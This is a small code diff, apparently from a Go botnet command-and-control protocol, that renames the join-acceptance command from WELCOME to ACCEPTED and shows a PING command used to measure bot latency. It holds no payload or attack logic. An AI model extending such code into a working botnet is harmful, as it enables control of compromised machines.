@@ -24,9 +24,9 @@ type CommandArgs map[string]string
 type CommandType string
 
 var (
-	// CommandTypeWelcome is the response to a successful botnet join attempt
+	// CommandTypeAccepted is the response to a successful botnet join attempt
 	// from a slave
-	CommandTypeWelcome = CommandType("WELCOME")
+	CommandTypeAccepted = CommandType("ACCEPTED")
 	// CommandTypePing requests a PONG from bots, allowing calculations of latency
 	CommandTypePing = CommandType("PING")
 	/*
